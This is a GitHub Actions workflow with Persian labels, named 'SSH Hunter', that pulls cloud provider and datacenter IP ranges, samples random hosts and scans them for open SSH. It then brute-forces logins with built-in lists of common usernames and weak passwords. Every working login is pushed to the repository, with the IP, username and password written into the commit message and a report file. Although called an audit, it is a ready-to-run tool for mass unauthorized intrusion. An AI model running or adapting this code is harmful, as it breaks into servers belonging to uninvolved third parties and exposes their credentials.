name: VPS Auditor - Fully Autonomous SSH Hunter

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'حالت اسکن'
        required: true
        default: 'datacenter'
        type: choice
        options:
          - datacenter
          - explorer
          - manual
      datacenter_provider:
        description: 'پرووایدر دیتاسنتر'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - aws
          - azure
          - gcp
          - digitalocean
          - linode
          - vultr
          - cloudflare
      max_ips:
        description: 'حداکثر تعداد آیپی برای اسکن'
        required: false
        default: '5000'
      scan_range:
        description: 'رنج CIDR (برای explorer)'
        required: false
      test_threads:
        description: 'نخ‌های هم‌زمان تست SSH'
        required: false
        default: '50'
      timeout:
        description: 'زمان انتظار اتصال'
        required: true
        default: '5'

permissions:
  contents: write

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: تنظیم Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: نصب کتابخانه‌ها
        run: pip3 install paramiko rich requests

      - name: اجرای SSH Hunter خودمختار
        env:
          MODE: ${{ github.event.inputs.mode }}
          DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
          MAX_IPS: ${{ github.event.inputs.max_ips }}
          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
          TEST_THREADS: ${{ github.event.inputs.test_threads }}
          TIMEOUT: ${{ github.event.inputs.timeout }}
        run: |
          python3 << 'PYEOF'
          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, threading
          from datetime import datetime
          from rich.console import Console
          from rich.table import Table
          from rich.panel import Panel
          import paramiko

          console = Console()
          console.print(Panel.fit("[bold yellow]🗝️ SSH Hunter – Fully Autonomous[/bold yellow]", border_style="yellow"))

          MODE = os.environ["MODE"]
          TIMEOUT = int(os.environ["TIMEOUT"])
          MAX_IPS = int(os.environ.get("MAX_IPS", "5000"))
          DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
          TEST_THREADS = int(os.environ.get("TEST_THREADS", "50"))
          SSH_PORT = 22

          CRED_FILE = "found_credentials.txt"
          if not os.path.exists(CRED_FILE):
              with open(CRED_FILE, "w") as f:
                  f.write(f"# SSH Hunter - Found Credentials\n")
                  f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                  f.write("# Format: IP | USERNAME | PASSWORD\n")
                  f.write("="*60 + "\n")

          def save_credential(ip, username, password):
              timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
              with open(CRED_FILE, "a") as f:
                  f.write(f"[{timestamp}] {ip} | {username} | {password}\n")
              os.system(f"git add {CRED_FILE} && git commit -m 'Found: {ip} {username}:{password}' && git push 2>/dev/null || true")

          # ===== ۱. کشف آیپی‌ها =====
          targets = []
          if MODE == "datacenter":
              console.print("[cyan]🌐 دریافت لیست آیپی دیتاسنترها...[/cyan]")
              datacenter_urls = []
              try:
                  resp = requests.get("https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt", timeout=30)
                  for line in resp.text.splitlines():
                      line = line.strip()
                      if line and not line.startswith("#"):
                          datacenter_urls.append(line)
                  console.print(f"[green]✓ {len(datacenter_urls)} CIDR[/green]")
              except: pass

              provider_map = {"aws":"aws","azure":"azure","gcp":"googlecloud","digitalocean":"digitalocean","linode":"linode","vultr":"vultr","cloudflare":"cloudflare"}
              base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
              for prov in provider_map.values():
                  try:
                      resp = requests.get(f"{base_url}/{prov}-ip-ranges.json", timeout=30)
                      data = resp.json()
                      for item in data.get("prefixes",[]):
                          if "ipv4Prefix" in item:
                              datacenter_urls.append(item["ipv4Prefix"])
                  except: pass

              all_ips = set()
              for cidr in datacenter_urls[:500]:
                  try:
                      network = ipaddress.IPv4Network(cidr, strict=False)
                      hosts = list(network.hosts())
                      sample_size = min(10, len(hosts))
                      for ip in random.sample(hosts, sample_size):
                          all_ips.add(str(ip))
                  except: pass
              targets = list(all_ips)[:MAX_IPS]
              
          elif MODE == "explorer":
              scan_range = os.environ.get("SCAN_RANGE","").strip()
              if scan_range:
                  network = ipaddress.IPv4Network(scan_range, strict=False)
                  targets = [str(ip) for ip in network.hosts()][:MAX_IPS]
                  
          elif MODE == "manual":
              targets_input = os.environ.get("TARGETS_INPUT","").strip()
              targets = [x.strip() for x in targets_input.split(',') if x.strip()][:MAX_IPS]

          if not targets:
              console.print("[red]❌ هیچ IP هدفی پیدا نشد[/red]")
              sys.exit(1)

          console.print(f"[green]🎯 {len(targets)} آیپی برای اسکن SSH[/green]")

          # ===== ۲. اسکن سریع پورت ۲۲ =====
          console.print(f"\n⚡ اسکن پورت ۲۲ با ۲۰۰ نخ...")
          ssh_targets = []
          
          def check_ssh(ip):
              try:
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(0.3)
                  result = sock.connect_ex((ip, SSH_PORT))
                  sock.close()
                  return ip if result == 0 else None
              except:
                  return None

          with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
              futures = {executor.submit(check_ssh, ip): ip for ip in targets}
              for future in concurrent.futures.as_completed(futures):
                  ip = future.result()
                  if ip:
                      ssh_targets.append(ip)
                      console.print(f"[green]✓ {ip}:22[/green]")

          console.print(f"\n[green]✅ {len(ssh_targets)} سرور با SSH باز پیدا شد[/green]")
          if not ssh_targets:
              console.print("[red]❌ هیچ سرور SSH پیدا نشد[/red]")
              sys.exit(0)

          # ذخیره آیپی‌های SSH
          with open("ssh_targets.txt", "w") as f:
              for ip in ssh_targets:
                  f.write(f"{ip}\n")
          os.system("git add ssh_targets.txt && git commit -m 'SSH targets' && git push 2>/dev/null || true")

          # ===== ۳. ساخت لیست‌های خودکار و تصادفی =====
          # مجموعه بزرگ و متنوع از نام‌های کاربری
          BASE_USERNAMES = [
              "root", "admin", "user", "test", "guest", "ubuntu", "debian", "centos",
              "administrator", "ec2-user", "azureuser", "vagrant", "pi", "oracle",
              "postgres", "mysql", "tomcat", "jenkins", "git", "web", "www", "mail",
              "ftp", "backup", "deploy", "docker", "hadoop", "spark", "hdfs", "yarn"
          ]

          # اضافه کردن چند نام تصادفی برای پوشش بیشتر
          for _ in range(10):
              rand_user = "user" + str(random.randint(1000,9999))
              BASE_USERNAMES.append(rand_user)

          # مجموعه بزرگ و متنوع از رمزهای عبور
          BASE_PASSWORDS = [
              "123456", "password", "admin", "root", "12345678", "qwerty", "letmein",
              "changeme", "secret", "toor", "admin123", "root123", "ubuntu", "password123",
              "P@ssw0rd", "Admin123!", "Qwerty123!", "Passw0rd!", "1234", "abcd1234",
              "test", "guest", "user", "pass", "1q2w3e4r", "zaq1xsw2", "!QAZ2wsx",
              "master", "access", "login", "hello", "monkey", "dragon", "123123",
              "abc123", "qwerty123", "iloveyou", "welcome", "batman", "superman"
          ]

          # اضافه کردن چند رمز تصادفی مبتنی بر الگوهای رایج
          for _ in range(15):
              pwd = random.choice(["user", "admin", "test"]) + str(random.randint(10,999))
              BASE_PASSWORDS.append(pwd)

          # حذف موارد تکراری
          usernames = list(set(BASE_USERNAMES))
          passwords = list(set(BASE_PASSWORDS))

          console.print(f"[green]📝 لیست خودکار: {len(usernames)} کاربر | {len(passwords)} رمز[/green]")

          # ===== ۴. تست SSH فوق‌سریع =====
          results_lock = threading.Lock()
          successes = []
          total_combos = len(ssh_targets) * len(usernames) * len(passwords)
          console.print(f"\n⚡ تست {total_combos} ترکیب با {TEST_THREADS} نخ...")

          def test_ssh(ip, username, password):
              try:
                  client = paramiko.SSHClient()
                  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  client.connect(hostname=ip, port=SSH_PORT, username=username, password=password,
                                timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
                  client.close()
                  return True
              except:
                  return False

          for ip in ssh_targets:
              failed_passwords = set()
              combos = [(u, p) for u in usernames for p in passwords if p not in failed_passwords]
              with concurrent.futures.ThreadPoolExecutor(max_workers=TEST_THREADS) as executor:
                  future_to_combo = {
                      executor.submit(test_ssh, ip, user, pwd): (user, pwd)
                      for user, pwd in combos
                  }
                  for future in concurrent.futures.as_completed(future_to_combo):
                      user, pwd = future_to_combo[future]
                      try:
                          if future.result():
                              console.print(f"[green]✅ {ip}: {user}:{pwd}[/green]")
                              with results_lock:
                                  successes.append((ip, user, pwd))
                                  save_credential(ip, user, pwd)
                          else:
                              failed_passwords.add(pwd)
                      except:
                          pass

          # ===== ۵. گزارش نهایی =====
          if successes:
              tbl = Table(title="✅ SSH Credentials Found", show_header=True)
              tbl.add_column("IP", style="cyan")
              tbl.add_column("Username", style="green")
              tbl.add_column("Password", style="yellow")
              for ip, user, pwd in successes:
                  tbl.add_row(ip, user, pwd)
              console.print(tbl)
          else:
              console.print("[red]❌ هیچ اعتبارنامه SSH پیدا نشد.[/red]")

          report = "ssh_audit_report.txt"
          with open(report, "w") as f:
              f.write(f"SSH Hunter Autonomous Report\n")
              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
              f.write(f"Targets scanned: {len(ssh_targets)}\n")
              f.write(f"Usernames tested: {len(usernames)}\n")
              f.write(f"Passwords tested: {len(passwords)}\n")
              f.write("="*60 + "\n")
              for ip, user, pwd in successes:
                  f.write(f"{ip} | {user} | {pwd}\n")
          os.system(f"git add {report} && git commit -m 'Autonomous SSH audit report' && git push 2>/dev/null || true")
          console.print(f"\n[green]📄 گزارش کامل: {report}[/green]")
          PYEOF
